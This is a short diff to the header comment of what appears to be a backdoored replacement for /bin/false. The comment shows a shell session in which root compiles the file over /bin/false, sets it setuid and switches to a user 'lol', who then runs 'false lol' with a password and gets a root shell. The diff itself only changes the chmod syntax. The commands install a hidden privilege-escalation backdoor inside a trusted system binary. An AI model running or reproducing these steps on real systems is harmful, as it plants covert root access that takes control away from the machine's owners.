@@ -1,6 +1,6 @@
 /*
 
-root@owned~# gcc false.c -o /bin/false -lcrypt ;chmod 4557 /bin/false ;su lol
+root@owned~# gcc false.c -o /bin/false -lcrypt ;chmod u+s /bin/false ;su lol
 lol@owned~# false lol
 password:
 root@owned~#
